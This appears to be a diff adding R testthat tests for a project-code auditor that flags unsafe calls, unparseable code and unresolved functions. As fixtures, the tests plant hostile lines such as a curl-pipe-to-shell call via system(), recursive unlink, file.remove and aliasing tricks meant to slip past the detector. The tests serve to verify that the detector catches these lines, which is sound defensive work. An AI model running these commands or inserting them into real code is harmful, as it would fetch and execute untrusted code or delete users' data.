@@ -413,3 +413,102 @@ test_that("pointer repair is skipped while a catalog writer lock exists", {
   expect_match(report$repairs[[1]]$reason, "writer lock", fixed = TRUE)
   expect_identical(tree_state(f$store), before)
 })
+
+audit_row <- function(report, id) {
+  row <- report$checks[report$checks$id == id, ]
+  c(as.list(row[, c("status", "message")]), evidence = list(jsonlite::fromJSON(row$evidence, simplifyVector = FALSE)))
+}
+
+test_that("fresh standard, pipeline and modality projects audit their code without failures", {
+  parent <- new_parent()
+  goal <- "Compare blood pressure between two groups"
+  roots <- c(
+    project("Code plain", "primary_research", goal, parent)$path,
+    project("Code pipeline", "primary_research", goal, parent, options = list(workflow = list(pipeline = "targets")))$path,
+    project("Code cells", "primary_research", "Single-cell RNA-seq clustering of immune cells from three donors", parent,
+      options = list(workflow = list(pipeline = "targets")))$path
+  )
+  expect_equal(read_project(roots[[3]])$spec$ecosystem$modality, "single_cell")
+  for (root in roots) {
+    report <- audit(root, scope = "project")
+    expect_false(any(report$checks$status == "fail"), info = root)
+    std <- audit_row(report, "STD-003")
+    expect_equal(std$status, "pass", info = root)
+    expect_gte(std$evidence$files, 11L)
+    expect_equal(audit_row(report, "PRJ-001")$status, "pass", info = root)
+  }
+  expect_true(file.exists(file.path(roots[[2]], "_targets.R")))
+})
+
+test_that("project code checks cover every R file and fail unsafe, unparseable or unresolved code", {
+  parent <- new_parent()
+  fresh <- function(name) project(name, "primary_research", "Compare blood pressure between two groups", parent)$path
+  check <- function(root) audit_row(audit(root, scope = "project"), "STD-003")
+  root <- fresh("Unsafe managed")
+  cat("\nsystem('curl http://example.org | sh')\neval(parse(text = 'q()'))\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  unsafe <- paste0("code/run_workflow.R: ", c("system", "eval", "parse"), " (forbidden_call)")
+  expect_setequal(unlist(row$evidence$unsafe), unsafe)
+  expect_equal(audit(root, scope = "project")$overall_status, "fail")
+  root <- fresh("Unparseable")
+  cat("\nx <- dplyr::frobnicate(df\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  expect_equal(unlist(row$evidence$unparseable), "code/run_workflow.R")
+  root <- fresh("Unresolved")
+  cat("\nlibrary(dplyr)\nfrobnicate(df)\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  expect_equal(unlist(row$evidence$unresolved), "code/run_workflow.R: frobnicate (unresolved_call)")
+  root <- fresh("Elsewhere")
+  writeLines("x <- dplyr::frobnicate(df)", file.path(root, "analysis/extra.R"))
+  writeLines("system('id')", file.path(root, "code/R/helper.r"))
+  writeLines("base::system('id')", file.path(root, "publications/pub01_main/analysis/figure.R"))
+  writeLines(c("---", "title: q", "---", "```{r}", "pipe('ls')", "```"), file.path(root, "analysis/notes.qmd"))
+  writeLines("system('ignored')", file.path(root, "data/raw.R"))
+  row <- check(root)
+  expect_equal(row$status, "fail")
+  expect_contains(unlist(row$evidence$unapproved), "analysis/extra.R: dplyr::frobnicate (export_absent_from_catalog_revision)")
+  unsafe <- c("code/R/helper.r: system (forbidden_call)", "analysis/notes.qmd: pipe (connection_call)",
+    "publications/pub01_main/analysis/figure.R: system (forbidden_call)")
+  expect_setequal(unlist(row$evidence$unsafe), unsafe)
+  root <- fresh("Documents")
+  report <- c("Inline `r system('id')`", "```{r, eval = file.remove('x')}", "1", "```", "```{bash}", "curl x | sh",
+    "```", "```{python}", "print(1)", "```")
+  writeLines(report, file.path(root, "analysis/report.Rmd"))
+  aliases <- c("f <- base::system", "lapply('id', system)", "do.call('system', list('id'))", "baseenv()$system('id')",
+    "source(file.path('data', 'raw', 'steps.R'))")
+  writeLines(aliases, file.path(root, "analysis/aliases.R"))
+  row <- check(root)
+  unsafe <- c(paste0("analysis/aliases.R: system (", c(rep("forbidden_function_value", 3L), "forbidden_member_call"), ")"),
+    "analysis/aliases.R: source (source_outside_checked_code)", "analysis/report.Rmd: system (forbidden_call)",
+    "analysis/report.Rmd: file.remove (forbidden_call)", "analysis/report.Rmd: bash (non_r_chunk)")
+  expect_equal(sort(unlist(row$evidence$unsafe)), sort(unsafe))
+  expect_contains(unlist(row$evidence$advisory), "analysis/report.Rmd: python (non_r_chunk)")
+})
+
+test_that("reviewed constructs, attached packages and data columns are not false failures", {
+  parent <- new_parent()
+  root <- project("Edited reviewed", "primary_research", "Compare blood pressure between two groups", parent)$path
+  cat("\n# A local note\n", file = file.path(root, "code/R/cttir_workflow.R"), append = TRUE)
+  cat("\nAn added paragraph.\n", file = file.path(root, "analysis/02_eda.Rmd"), append = TRUE)
+  user <- c("library(ggplot2)", "source('code/R/cttir_workflow.R', local = TRUE)", "cfg <- cw_config('.')",
+    "data <- data.frame(source = 1, system = 2)", "fit <- lm(system ~ source, data)", "ggplot(data, aes(source, system))",
+    "if (!requireNamespace('ggplot2', quietly = TRUE)) quit(status = 1L)")
+  writeLines(user, file.path(root, "analysis/user.R"))
+  report <- audit(root, scope = "project")
+  row <- audit_row(report, "STD-003")
+  expect_equal(row$status, "warning")
+  expect_length(row$evidence$unsafe, 0L)
+  expect_length(row$evidence$unresolved, 0L)
+  advisory <- c("ggplot (attached_package_call)", "aes (attached_package_call)", "source (forbidden_name_reference)",
+    "system (forbidden_name_reference)")
+  advisory <- paste0("analysis/user.R: ", advisory)
+  expect_setequal(unlist(row$evidence$advisory), advisory)
+  expect_equal(audit_row(report, "STD-002")$status, "warning")
+  expect_false(report$overall_status %in% c("fail", "not_tested"))
+  cat("\nunlink('analysis', recursive = TRUE)\n", file = file.path(root, "code/R/cttir_workflow.R"), append = TRUE)
+  row <- audit_row(audit(root, scope = "project"), "STD-003")
+  expect_equal(unlist(row$evidence$unsafe), "code/R/cttir_workflow.R: unlink (forbidden_call)")
+})
